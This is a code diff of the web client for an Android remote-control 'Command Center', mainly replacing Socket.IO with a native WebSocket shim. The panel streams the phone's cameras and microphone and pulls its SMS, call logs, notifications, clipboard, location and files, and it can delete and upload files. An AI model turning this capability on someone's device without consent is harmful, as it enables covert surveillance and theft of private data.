@@ -1,24 +1,248 @@
-// Command Center Core Client Logic
+// Command Center Core Client Logic — Native WebSocket Edition
+
+// ─────────────────────────────────────────────────────────────
+// Signaling URL resolution
+// ─────────────────────────────────────────────────────────────
 
 function getServerURL() {
   const hostname = window.location.hostname;
-  // Use localhost for local loopbacks, otherwise reflect window domain
   if (hostname === 'localhost' || hostname === '127.0.0.1' || hostname.startsWith('192.168.') || hostname.startsWith('10.') || hostname.startsWith('172.')) {
     return 'http://localhost:3000';
   }
   return window.location.origin;
 }
 
-const socket = io(getServerURL(), {
-  reconnection: true,
-  reconnectionAttempts: 20,
-  reconnectionDelay: 2000,
-  reconnectionDelayMax: 10000,
-  randomizationFactor: 0.5,
-  timeout: 20000
-});
+function getWebSocketURL() {
+  const base = getServerURL();
+  if (base.startsWith('https://')) return 'wss://' + base.substring(8);
+  if (base.startsWith('http://'))  return 'ws://'  + base.substring(7);
+  return base;
+}
 
+// ─────────────────────────────────────────────────────────────
+// SignalingWebSocket — Drop-in replacement for Socket.IO client
+// ─────────────────────────────────────────────────────────────
+//
+// Mimics the Socket.IO client API on top of the native WebSocket:
+//   socket.on(eventName, handler)   — register event listener
+//   socket.emit(eventName, payload) — send JSON message { type, ...payload }
+//   socket.connect() / socket.disconnect()
+//   socket.connected  (property)
+//   socket.id         (property, set after server handshake)
+//
+// Special events that carry a single "id" string:
+//   id, web-client-ready, web-client-disconnected,
+//   android-client-ready, android-client-disconnected
+//
+// Lifecycle events are synthesized:
+//   'connect'       → fired on WebSocket open
+//   'connect_error' → fired on WebSocket error
+//   'disconnect'    → fired on WebSocket close
+//
+// ─────────────────────────────────────────────────────────────
+
+class SignalingWebSocket {
+  constructor(url) {
+    this.url = url;
+    this.ws = null;
+    this._id = null;
+    this._connected = false;
+    this._listeners = new Map();      // eventName -> [handlers]
+    this._shouldReconnect = false;
+    this._reconnectDelay = 2000;
+    this._reconnectMaxDelay = 10000;
+    this._reconnectAttempts = 0;
+    this._maxReconnectAttempts = 20;
+    this._reconnectTimer = null;
+
+    // Events whose payload is a single string id (from the server)
+    this._idEvents = new Set([
+      'id',
+      'web-client-ready',
+      'web-client-disconnected',
+      'android-client-ready',
+      'android-client-disconnected'
+    ]);
+  }
+
+  // Public: register a listener
+  on(eventName, handler) {
+    if (!this._listeners.has(eventName)) {
+      this._listeners.set(eventName, []);
+    }
+    this._listeners.get(eventName).push(handler);
+    return this;
+  }
+
+  // Public: send a message to the server
+  emit(eventName, payload) {
+    if (!this.ws || this.ws.readyState !== WebSocket.OPEN) {
+      console.warn(`[WS] Cannot emit "${eventName}" — not connected`);
+      return this;
+    }
+
+    let message;
+    if (eventName === 'identify') {
+      // Special case: the server expects { type: "identify", clientType: "web" }
+      message = { type: 'identify', clientType: payload || 'web' };
+    } else if (payload === undefined || payload === null) {
+      message = { type: eventName };
+    } else if (typeof payload === 'object') {
+      message = Object.assign({ type: eventName }, payload);
+    } else {
+      message = { type: eventName, data: payload };
+    }
+
+    try {
+      this.ws.send(JSON.stringify(message));
+    } catch (e) {
+      console.error(`[WS] Failed to send "${eventName}"`, e);
+    }
+    return this;
+  }
+
+  // Public: getters
+  get id() { return this._id; }
+  get connected() { return this._connected; }
+
+  // Public: initiate connection
+  connect() {
+    if (this.ws && (this.ws.readyState === WebSocket.OPEN || this.ws.readyState === WebSocket.CONNECTING)) {
+      return this;
+    }
+    this._shouldReconnect = true;
+    this._openSocket();
+    return this;
+  }
+
+  // Public: close connection
+  disconnect() {
+    this._shouldReconnect = false;
+    if (this._reconnectTimer) {
+      clearTimeout(this._reconnectTimer);
+      this._reconnectTimer = null;
+    }
+    if (this.ws) {
+      try { this.ws.close(1000, 'Client disconnect'); } catch (e) {}
+      this.ws = null;
+    }
+    this._connected = false;
+    this._id = null;
+    return this;
+  }
+
+  // ── Internal ──────────────────────────────────────────────
+
+  _openSocket() {
+    console.log('[WS] Opening connection to', this.url);
+    try {
+      this.ws = new WebSocket(this.url);
+    } catch (e) {
+      console.error('[WS] Failed to create WebSocket:', e);
+      this._dispatch('connect_error', e);
+      this._scheduleReconnect();
+      return;
+    }
+
+    this.ws.onopen = () => {
+      console.log('[WS] Connected');
+      this._connected = true;
+      this._reconnectAttempts = 0;
+      this._dispatch('connect');
+      // Send identify handshake for web client
+      this.emit('identify', 'web');
+    };
+
+    this.ws.onmessage = (event) => {
+      let msg;
+      try {
+        msg = JSON.parse(event.data);
+      } catch (e) {
+        console.warn('[WS] Invalid JSON:', event.data);
+        return;
+      }
+
+      const type = msg.type;
+      if (!type) {
+        console.warn('[WS] Message without type:', msg);
+        return;
+      }
+
+      // Capture the assigned server ID
+      if (type === 'id') {
+        this._id = msg.id || null;
+        console.log('[WS] Assigned ID:', this._id);
+        this._dispatch('id', this._id);
+        return;
+      }
+
+      // ID-only events — dispatch the id string as first arg
+      if (this._idEvents.has(type)) {
+        this._dispatch(type, msg.id);
+        return;
+      }
+
+      // Regular events — dispatch the full message object
+      this._dispatch(type, msg);
+    };
+
+    this.ws.onerror = (e) => {
+      console.warn('[WS] Error:', e);
+      this._dispatch('connect_error', e);
+    };
+
+    this.ws.onclose = (e) => {
+      console.log('[WS] Closed:', e.code, e.reason);
+      this._connected = false;
+      this._id = null;
+      this._dispatch('disconnect', e);
+      if (this._shouldReconnect) {
+        this._scheduleReconnect();
+      }
+    };
+  }
+
+  _scheduleReconnect() {
+    if (this._reconnectTimer) return;
+    if (this._reconnectAttempts >= this._maxReconnectAttempts) {
+      console.warn('[WS] Max reconnect attempts reached');
+      return;
+    }
+    const delay = Math.min(
+      this._reconnectDelay * Math.pow(1.5, this._reconnectAttempts),
+      this._reconnectMaxDelay
+    );
+    this._reconnectAttempts++;
+    console.log(`[WS] Reconnecting in ${Math.round(delay)}ms (attempt ${this._reconnectAttempts})`);
+    this._reconnectTimer = setTimeout(() => {
+      this._reconnectTimer = null;
+      if (this._shouldReconnect) this._openSocket();
+    }, delay);
+  }
+
+  _dispatch(eventName, payload) {
+    const handlers = this._listeners.get(eventName);
+    if (!handlers || handlers.length === 0) return;
+    for (const handler of handlers) {
+      try {
+        handler(payload);
+      } catch (e) {
+        console.error(`[WS] Handler for "${eventName}" threw:`, e);
+      }
+    }
+  }
+}
+
+// ─────────────────────────────────────────────────────────────
+// Socket instance
+// ─────────────────────────────────────────────────────────────
+
+const socket = new SignalingWebSocket(getWebSocketURL());
+socket.connect();
+
+// ─────────────────────────────────────────────────────────────
 // Video Sinks
+// ─────────────────────────────────────────────────────────────
 const videoFront = document.getElementById('remoteVideoFront');
 const videoBack = document.getElementById('remoteVideoBack');
 const tagFront = document.getElementById('tagFront');
@@ -146,7 +370,7 @@ let localMicStream = null;
 let localMicSender = null;
 
 // Chunked Download State
-let activeDownloads = {}; 
+let activeDownloads = {};
 let isTalkbackActive = false;
 
 // Graphing Buffer State
@@ -197,7 +421,7 @@ function reconnectSocket() {
 function switchTab(activeTab, activePane) {
   [tabNotifications, tabCalls, tabSms, tabApps].forEach(t => t.classList.remove('active'));
   [paneNotifications, paneCalls, paneSms, paneApps].forEach(p => p.style.display = 'none');
-  
+
   activeTab.classList.add('active');
   activePane.style.display = activePane === paneApps ? 'flex' : 'block';
 }
@@ -321,16 +545,14 @@ function drawSensorChart() {
   const canvas = canvasCtx.canvas;
   const w = canvas.width;
   const h = canvas.height;
-  
-  // Clear canvas
+
   canvasCtx.fillStyle = '#0a0d14';
   canvasCtx.fillRect(0, 0, w, h);
-  
+
   if (sensorHistory.length === 0) return;
-  
+
   const step = w / maxHistoryPoints;
-  
-  // Draw grid lines
+
   canvasCtx.strokeStyle = 'rgba(255, 255, 255, 0.03)';
   canvasCtx.lineWidth = 1;
   for (let i = 0; i < maxHistoryPoints; i += 10) {
@@ -340,15 +562,13 @@ function drawSensorChart() {
     canvasCtx.lineTo(x, h);
     canvasCtx.stroke();
   }
-  
-  // Render Accelerometer lines (scale vectors to fit)
+
   const drawLine = (valExtractor, color) => {
     canvasCtx.strokeStyle = color;
     canvasCtx.lineWidth = 1.5;
     canvasCtx.beginPath();
     sensorHistory.forEach((pt, idx) => {
       const val = valExtractor(pt);
-      // Map accel values (-10 to 10) to canvas height
       const y = h/2 - (val / 15) * (h/2);
       const x = idx * step;
       if (idx === 0) canvasCtx.moveTo(x, y);
@@ -356,13 +576,11 @@ function drawSensorChart() {
     });
     canvasCtx.stroke();
   };
-  
-  // Render Lux lines
+
   canvasCtx.strokeStyle = '#10b981';
   canvasCtx.lineWidth = 1.5;
   canvasCtx.beginPath();
   sensorHistory.forEach((pt, idx) => {
-    // Map log scale lux to height
     const lux = pt.lux || 0;
     const normLux = Math.min(1, Math.log10(lux + 1) / 4);
     const y = h - normLux * (h - 10) - 5;
@@ -371,7 +589,7 @@ function drawSensorChart() {
     else canvasCtx.lineTo(x, y);
   });
   canvasCtx.stroke();
-  
+
   drawLine(pt => pt.accelX || 0, '#ef4444');
   drawLine(pt => pt.accelY || 0, '#f59e0b');
   drawLine(pt => pt.accelZ || 0, '#3b82f6');
@@ -425,8 +643,7 @@ function updateStreams() {
 // ─────────────────────────────────────────────────────────────
 
 volumeSlider.addEventListener('input', (e) => {
-  const val = e.target.value;
-  volumeVal.textContent = `${val}%`;
+  volumeVal.textContent = `${e.target.value}%`;
 });
 
 volumeSlider.addEventListener('change', (e) => {
@@ -437,8 +654,7 @@ volumeSlider.addEventListener('change', (e) => {
 });
 
 brightnessSlider.addEventListener('input', (e) => {
-  const val = e.target.value;
-  brightnessVal.textContent = `${val}%`;
+  brightnessVal.textContent = `${e.target.value}%`;
 });
 
 brightnessSlider.addEventListener('change', (e) => {
@@ -455,7 +671,6 @@ flashlightToggle.addEventListener('change', (e) => {
   socket.emit('cmd:flashlight', { to: androidClientId, on: isChecked });
 });
 
-// TTS Voice Broadcast listeners
 ttsPitch.addEventListener('input', (e) => {
   ttsPitchVal.textContent = parseFloat(e.target.value).toFixed(1);
 });
@@ -474,18 +689,16 @@ btnTtsSpeak.addEventListener('click', () => {
   socket.emit('cmd:tts_speak', { to: androidClientId, text: text, pitch: pitch, speed: speed });
 });
 
-// Talkback intercom button listener
 talkbackToggle.addEventListener('click', async () => {
   if (!androidClientId || !peer) return;
-  
+
   if (isTalkbackActive) {
-    // Stop talkback microphone streaming
     isTalkbackActive = false;
     talkbackToggle.textContent = '🎙️ Talkback OFF';
     talkbackToggle.style.color = 'var(--text-muted)';
     talkbackToggle.style.borderColor = 'rgba(255,255,255,0.05)';
     talkbackToggle.style.background = 'transparent';
-    
+
     if (localMicSender) {
       peer.removeTrack(localMicSender);
       localMicSender = null;
@@ -496,13 +709,11 @@ talkbackToggle.addEventListener('click', async () => {
     }
     logDebug('[TALKBACK] Microphone transmission suspended');
   } else {
-    // Initiate talkback microphone streaming
     try {
       localMicStream = await navigator.mediaDevices.getUserMedia({ audio: true });
       const track = localMicStream.getAudioTracks()[0];
       localMicSender = peer.addTrack(track, localMicStream);
-      
-      // Renegotiate SDP offer to send audio track to device
+
       const offer = await peer.createOffer();
       await peer.setLocalDescription(offer);
       socket.emit('signal', {
@@ -510,7 +721,7 @@ talkbackToggle.addEventListener('click', async () => {
         from: myId,
         signal: { type: 'offer', sdp: offer.sdp }
       });
-      
+
       isTalkbackActive = true;
       talkbackToggle.textContent = '🎙️ Talkback ACTIVE';
       talkbackToggle.style.color = '#10b981';
@@ -585,8 +796,6 @@ btnRecord.addEventListener('click', () => {
   socket.emit('cmd:record', { to: androidClientId });
 });
 
-// Modal Actions
-// Clipboard Actions
 btnFetchClipboard.addEventListener('click', () => {
   if (!androidClientId) return;
   logDebug('[CMD] Fetching primary clipboard context');
@@ -600,7 +809,6 @@ btnSetClipboard.addEventListener('click', () => {
   socket.emit('cmd:set_clipboard', { to: androidClientId, text: text });
 });
 
-// Snapshot Actions
 btnSnapFront.addEventListener('click', () => {
   if (!androidClientId) return;
   logDebug('[CMD] Capturing snapshot frame: Front lens');
@@ -642,10 +850,6 @@ btnOpenUrl.addEventListener('click', () => {
     socket.emit('cmd:open_url', { to: androidClientId, url: url });
   });
 });
-
-// ─────────────────────────────────────────────────────────────
-// Modal dialog box handler
-// ─────────────────────────────────────────────────────────────
 
 function openModal(title, description, defaultValue, callback) {
   dialogTitle.textContent = title;
@@ -689,13 +893,12 @@ function renderFileList(files, path) {
     fsPathInput.value = path;
   }
   fileListDiv.innerHTML = '';
-  
+
   if (!files || files.length === 0) {
     fileListDiv.innerHTML = '<div style="color: var(--text-muted); padding: 14px; font-size: 0.85rem;">This directory is empty.</div>';
     return;
   }
 
-  // Sort Directories first
   files.sort((a, b) => {
     if (a.isDir && !b.isDir) return -1;
     if (!a.isDir && b.isDir) return 1;
@@ -712,7 +915,7 @@ function renderFileList(files, path) {
 
     const info = document.createElement('div');
     info.className = 'file-info';
-    
+
     const name = document.createElement('div');
     name.className = 'file-name';
     name.textContent = file.name;
@@ -727,28 +930,26 @@ function renderFileList(files, path) {
 
     const actions = document.createElement('div');
     actions.className = 'file-actions';
-    
+
     if (!file.isDir) {
-        // Download Action
-        const downloadBtn = document.createElement('button');
-        downloadBtn.className = 'btn-file-action download';
-        downloadBtn.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"/></svg>`;
-        downloadBtn.onclick = (e) => {
-            e.stopPropagation();
-            requestFileDownload(file.path);
-        };
-        actions.appendChild(downloadBtn);
+      const downloadBtn = document.createElement('button');
+      downloadBtn.className = 'btn-file-action download';
+      downloadBtn.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"/></svg>`;
+      downloadBtn.onclick = (e) => {
+        e.stopPropagation();
+        requestFileDownload(file.path);
+      };
+      actions.appendChild(downloadBtn);
     }
-    
-    // Delete Action
+
     const deleteBtn = document.createElement('button');
     deleteBtn.className = 'btn-file-action delete';
     deleteBtn.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"/></svg>`;
     deleteBtn.onclick = (e) => {
-        e.stopPropagation();
-        if(confirm(`Permanently delete ${file.name}?`)) {
-            deleteFile(file.path);
-        }
+      e.stopPropagation();
+      if (confirm(`Permanently delete ${file.name}?`)) {
+        deleteFile(file.path);
+      }
     };
     actions.appendChild(deleteBtn);
 
@@ -757,7 +958,7 @@ function renderFileList(files, path) {
     item.appendChild(actions);
 
     if (file.isDir) {
-        item.onclick = () => requestFileList(file.path);
+      item.onclick = () => requestFileList(file.path);
     }
 
     fileListDiv.appendChild(item);
@@ -765,46 +966,45 @@ function renderFileList(files, path) {
 }
 
 function formatBytes(bytes) {
-    if (bytes === 0) return '0 Bytes';
-    const k = 1024;
-    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
-    const i = Math.floor(Math.log(bytes) / Math.log(k));
-    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
+  if (bytes === 0) return '0 Bytes';
+  const k = 1024;
+  const sizes = ['Bytes', 'KB', 'MB', 'GB'];
+  const i = Math.floor(Math.log(bytes) / Math.log(k));
+  return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
 }
 
 function requestFileDownload(path) {
-    updateStatus(`Starting download: ${path}`);
-    if (androidClientId) {
-        socket.emit('fs:download', { to: androidClientId, path: path });
-    }
+  updateStatus(`Starting download: ${path}`);
+  if (androidClientId) {
+    socket.emit('fs:download', { to: androidClientId, path: path });
+  }
 }
 
 function deleteFile(path) {
-    updateStatus(`Requesting deletion: ${path}`);
-    if (androidClientId) {
-        socket.emit('fs:delete', { to: androidClientId, path: path });
-    }
+  updateStatus(`Requesting deletion: ${path}`);
+  if (androidClientId) {
+    socket.emit('fs:delete', { to: androidClientId, path: path });
+  }
 }
 
 fsGoBtn.addEventListener('click', () => {
-    requestFileList(fsPathInput.value);
+  requestFileList(fsPathInput.value);
 });
 
 fsBackBtn.addEventListener('click', () => {
-    let path = currentPath;
-    if (path.endsWith('/')) path = path.slice(0, -1);
-    if (path === '') path = '/';
-    
-    const lastSlash = path.lastIndexOf('/');
-    if (lastSlash !== -1) {
-        const parent = path.substring(0, lastSlash + 1) || '/'; 
-        requestFileList(parent);
-    } else {
-        requestFileList('/');
-    }
+  let path = currentPath;
+  if (path.endsWith('/')) path = path.slice(0, -1);
+  if (path === '') path = '/';
+
+  const lastSlash = path.lastIndexOf('/');
+  if (lastSlash !== -1) {
+    const parent = path.substring(0, lastSlash + 1) || '/';
+    requestFileList(parent);
+  } else {
+    requestFileList('/');
+  }
 });
 
-// Drag and drop remote uploader
 fsUploadArea.addEventListener('click', () => {
   fsUploadInput.click();
 });
@@ -840,46 +1040,44 @@ function uploadTargetFile(file) {
     logDebug('Cannot upload file, no device paired');
     return;
   }
-  
+
   logDebug(`[FS] Initiating chunked uploader: ${file.name} (${formatBytes(file.size)})`);
   fsUploadLabel.textContent = `Uploading ${file.name}... (0%)`;
   fsUploadProgress.style.width = '0%';
-  
+
   const reader = new FileReader();
   reader.onload = async (event) => {
     const rawBuffer = event.target.result;
-    const chunkSize = 64 * 1024; // 64 KB chunks
+    const chunkSize = 64 * 1024;
     const totalChunks = Math.ceil(rawBuffer.byteLength / chunkSize);
-    
+
     socket.emit('fs:upload_start', {
       to: androidClientId,
       filename: file.name,
       parentPath: currentPath,
       totalChunks: totalChunks
     });
-    
+
     for (let idx = 0; idx < totalChunks; idx++) {
       const start = idx * chunkSize;
       const end = Math.min(start + chunkSize, rawBuffer.byteLength);
       const slice = rawBuffer.slice(start, end);
-      
-      // Convert ArrayBuffer slice to base64 chunk
+
       const binary = String.fromCharCode.apply(null, new Uint8Array(slice));
       const base64 = btoa(binary);
-      
+
       socket.emit('fs:upload_chunk', {
         to: androidClientId,
         chunk: base64
       });
-      
+
       const pct = Math.floor(((idx + 1) / totalChunks) * 100);
       fsUploadProgress.style.width = `${pct}%`;
       fsUploadLabel.textContent = `Uploading ${file.name}... (${pct}%)`;
-      
-      // Minor delay throttle to prevent socket clogging
+
       await new Promise(r => setTimeout(r, 10));
     }
-    
+
     socket.emit('fs:upload_complete', { to: androidClientId });
     fsUploadLabel.textContent = 'Upload Completed successfully';
     logDebug(`[FS] File upload assembled on device: ${file.name}`);
@@ -888,30 +1086,35 @@ function uploadTargetFile(file) {
       fsUploadProgress.style.width = '0%';
     }, 4000);
   };
-  
+
   reader.readAsArrayBuffer(file);
 }
 
 // ─────────────────────────────────────────────────────────────
-// Socket Server Subscriptions
+// WebSocket event subscriptions (replaces Socket.IO handlers)
 // ─────────────────────────────────────────────────────────────
 
 socket.on('connect', () => {
   updateStatus('Connected to Command server');
 });
 
-socket.on('connect_error', (error) => {
+socket.on('connect_error', () => {
   updateStatus('Failed to connect to signaling host');
 });
 
-socket.on('id', id => {
-  myId = id;
-  logDebug(`Authenticated session ID: ${myId}`);
-  socket.emit('identify', 'web');
-  socket.emit('web-client-ready', myId);
+socket.on('disconnect', () => {
+  updateStatus('Disconnected from Command server');
 });
 
-socket.on('android-client-ready', id => {
+socket.on('id', (id) => {
+  myId = id;
+  logDebug(`Authenticated session ID: ${myId}`);
+  // No need to re-emit "identify" or "web-client-ready" — the SignalingWebSocket
+  // shim sends "identify" automatically on connection, and the server responds
+  // with the ID and the list of already-connected Android clients.
+});
+
+socket.on('android-client-ready', (id) => {
   if (androidClientId !== id) {
     androidClientId = id;
     logDebug(`Android Client Target identified: ${id}`);
@@ -920,13 +1123,13 @@ socket.on('android-client-ready', id => {
   }
 });
 
-socket.on('device_info', info => {
+socket.on('device_info', (info) => {
   logDebug('Received telemetry profile');
-  
+
   if (info.model) infoModel.textContent = info.model;
   if (info.manufacturer) infoManufacturer.textContent = info.manufacturer;
   if (info.version) infoVersion.textContent = `Android ${info.version}`;
-  
+
   if (info.battery !== undefined) {
     infoBattery.textContent = `${info.battery}%`;
     if (info.battery <= 15) {
@@ -938,12 +1141,10 @@ socket.on('device_info', info => {
     }
   }
 
-  // Draw battery details (temperature + charging plug)
   if (info.batteryTemp !== undefined && info.chargingSource) {
     infoBatteryDetails.textContent = `${info.batteryTemp}°C • ${info.chargingSource}`;
   }
 
-  // Draw Storage occupied metrics
   if (info.storageTotal !== undefined && info.storageFree !== undefined) {
     const occupied = (info.storageTotal - info.storageFree).toFixed(1);
     storageText.textContent = `${occupied} GB / ${info.storageTotal} GB`;
@@ -951,7 +1152,6 @@ socket.on('device_info', info => {
     storageProgress.style.width = `${pct}%`;
   }
 
-  // Update recording button status
   if (info.recording) {
     btnRecord.classList.add('active');
     btnRecord.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 10a1 1 0 011-1h4a1 1 0 011 1v4a1 1 0 01-1 1h-4a1 1 0 01-1-1v-4z"/></svg> Stop Rec`;
@@ -961,29 +1161,27 @@ socket.on('device_info', info => {
   }
 });
 
-socket.on('notification', data => {
-  if (data.notification) {
-    addNotification(data.notification);
-  }
+socket.on('notification', (data) => {
+  if (data && data.notification) addNotification(data.notification);
 });
 
-socket.on('call_log', data => {
-  if (data.call_logs) {
+socket.on('call_log', (data) => {
+  if (data && data.call_logs) {
     callLogList.innerHTML = '';
     data.call_logs.forEach(addCallLog);
   }
 });
 
-socket.on('sms', data => {
-  if (data.sms_messages) {
+socket.on('sms', (data) => {
+  if (data && data.sms_messages) {
     smsList.innerHTML = '';
     data.sms_messages.forEach(addSmsMessage);
   }
 });
 
-socket.on('apps_list', data => {
+socket.on('apps_list', (data) => {
   logDebug('Apps list profiles updated');
-  if (data.apps) {
+  if (data && data.apps) {
     appList.innerHTML = '';
     data.apps.forEach(app => {
       const item = document.createElement('div');
@@ -998,8 +1196,7 @@ socket.on('apps_list', data => {
       `;
       appList.appendChild(item);
     });
-    
-    // Bind launch clicks
+
     appList.querySelectorAll('.btn-launch-app').forEach(btn => {
       btn.addEventListener('click', (e) => {
         if (!androidClientId) return;
@@ -1011,14 +1208,13 @@ socket.on('apps_list', data => {
   }
 });
 
-socket.on('sensor_data', data => {
-  if (data.sensors) {
+socket.on('sensor_data', (data) => {
+  if (data && data.sensors) {
     const s = data.sensors;
     if (s.lux !== undefined) sensorLux.textContent = `${s.lux.toFixed(0)} Lux`;
     if (s.proximity !== undefined) sensorProximity.textContent = s.proximity === 0.0 ? 'NEAR (0cm)' : 'FAR (normal)';
     if (s.accelX !== undefined) sensorAccel.textContent = `X:${s.accelX.toFixed(1)} Y:${s.accelY.toFixed(1)} Z:${s.accelZ.toFixed(1)}`;
-    
-    // Add point to graphing buffer
+
     sensorHistory.push({
       lux: s.lux || 0,
       accelX: s.accelX || 0,
@@ -1032,8 +1228,8 @@ socket.on('sensor_data', data => {
   }
 });
 
-socket.on('network_info', data => {
-  if (data.network) {
+socket.on('network_info', (data) => {
+  if (data && data.network) {
     const n = data.network;
     netSsid.textContent = n.ssid;
     netSpeed.textContent = `${n.linkSpeed} Mbps`;
@@ -1043,8 +1239,8 @@ socket.on('network_info', data => {
   }
 });
 
-socket.on('snapshot_data', data => {
-  if (data.snapshot) {
+socket.on('snapshot_data', (data) => {
+  if (data && data.snapshot) {
     logDebug(`Received camera snapshot from: ${data.snapshot.camera}`);
     currentSnapshotBase64 = data.snapshot.image;
     snapshotPreview.src = `data:image/jpeg;base64,${currentSnapshotBase64}`;
@@ -1052,31 +1248,35 @@ socket.on('snapshot_data', data => {
   }
 });
 
-socket.on('clipboard_data', data => {
-  if (data.clipboard !== undefined) {
+socket.on('clipboard_data', (data) => {
+  if (data && data.clipboard !== undefined) {
     clipboardTextArea.value = data.clipboard;
     logDebug(`Clipboard sync completed`);
   }
 });
 
-socket.on('location', data => {
-  updateMap(data.latitude, data.longitude);
+socket.on('location', (data) => {
+  if (data && data.latitude !== undefined) {
+    updateMap(data.latitude, data.longitude);
+  }
 });
 
-socket.on('fs:files', data => {
+socket.on('fs:files', (data) => {
   logDebug('Refreshing explorer directory tree');
-  if (data.file_list) {
+  if (data && data.file_list) {
     renderFileList(data.file_list.files, data.file_list.currentPath);
   }
 });
 
-socket.on('fs:delete_result', data => {
+socket.on('fs:delete_result', (data) => {
+  if (!data) return;
   logDebug(`[FS] Delete operation result: ${data.success ? 'SUCCESS' : 'FAILED'} for path ${data.path}`);
   updateStatus(data.success ? 'Deleted file successfully' : 'Failed to delete target file');
   requestFileList(currentPath);
 });
 
-socket.on('fs:download_start', data => {
+socket.on('fs:download_start', (data) => {
+  if (!data) return;
   const { fileId, name, size, totalChunks } = data;
   logDebug(`[FS] Starting chunked download: ${name} (${formatBytes(size)})`);
   activeDownloads[fileId] = {
@@ -1089,7 +1289,8 @@ socket.on('fs:download_start', data => {
   updateStatus(`Downloading ${name} (0%)`);
 });
 
-socket.on('fs:download_chunk', data => {
+socket.on('fs:download_chunk', (data) => {
+  if (!data) return;
   const { fileId, chunkIndex, content } = data;
   const download = activeDownloads[fileId];
   if (download) {
@@ -1104,23 +1305,25 @@ socket.on('fs:download_chunk', data => {
   }
 });
 
-socket.on('fs:download_complete', data => {
+socket.on('fs:download_complete', (data) => {
+  if (!data) return;
   const { fileId } = data;
   const download = activeDownloads[fileId];
   if (download) {
     logDebug(`[FS] File download assembled: ${download.name}`);
     updateStatus(`Writing stream data...`);
-    
+
     const base64Complete = download.buffer.join('');
     downloadBase64File(base64Complete, download.name);
-    
+
     const duration = ((Date.now() - download.startTime) / 1000).toFixed(1);
     updateStatus(`Completed ${download.name} in ${duration}s`);
     delete activeDownloads[fileId];
   }
 });
 
-socket.on('fs:download_error', data => {
+socket.on('fs:download_error', (data) => {
+  if (!data) return;
   const { fileId, error } = data;
   if (activeDownloads[fileId]) {
     updateStatus(`Download error: ${activeDownloads[fileId].name}`);
@@ -1138,15 +1341,15 @@ function downloadBase64File(base64Data, fileName) {
 }
 
 socket.on('signal', async (data) => {
+  if (!data) return;
   const { from, signal } = data;
-  
+
   if (!androidClientId || androidClientId !== from) {
     androidClientId = from;
     updateStatus('Android device detected');
   }
 
-  // Update recording state if signal has status
-  if (signal.type === 'recording_status') {
+  if (signal && signal.type === 'recording_status') {
     if (signal.active) {
       btnRecord.classList.add('active');
       btnRecord.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 10a1 1 0 011-1h4a1 1 0 011 1v4a1 1 0 01-1 1h-4a1 1 0 01-1-1v-4z"/></svg> Stop Rec`;
@@ -1155,7 +1358,7 @@ socket.on('signal', async (data) => {
       btnRecord.classList.remove('active');
       btnRecord.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"/></svg> Record MP4`;
       logDebug(`Local recording saved to: ${signal.file}`);
-      requestFileList(currentPath); // Refresh explorer list to show new mp4
+      requestFileList(currentPath);
     }
     return;
   }
@@ -1202,7 +1405,7 @@ socket.on('signal', async (data) => {
   }
 
   try {
-    if (signal.type === 'offer') {
+    if (signal && signal.type === 'offer') {
       await peer.setRemoteDescription(new RTCSessionDescription(signal));
       const answer = await peer.createAnswer();
       await peer.setLocalDescription(answer);
@@ -1211,7 +1414,7 @@ socket.on('signal', async (data) => {
         from: myId,
         signal: { type: 'answer', sdp: answer.sdp }
       });
-    } else if (signal.candidate) {
+    } else if (signal && signal.candidate) {
       await peer.addIceCandidate(new RTCIceCandidate(signal.candidate));
     }
   } catch (err) {
@@ -1231,12 +1434,12 @@ socket.on('android-client-disconnected', () => {
   tagFront.style.background = 'rgba(239, 68, 68, 0.15)';
   tagFront.style.color = 'var(--danger)';
   tagFront.style.borderColor = 'var(--danger)';
-  
+
   tagBack.textContent = 'BACK DISCONNECTED';
   tagBack.style.background = 'rgba(239, 68, 68, 0.15)';
   tagBack.style.color = 'var(--danger)';
   tagBack.style.borderColor = 'var(--danger)';
-  
+
   notificationsList.innerHTML = '';
   callLogList.innerHTML = '';
   smsList.innerHTML = '';
@@ -1247,7 +1450,7 @@ socket.on('android-client-disconnected', () => {
 });
 
 socket.on('error', (error) => {
-  updateStatus(`Signal Error: ${error.message}`);
+  if (error && error.message) updateStatus(`Signal Error: ${error.message}`);
 });
 
 retryButton.addEventListener('click', reconnectSocket);
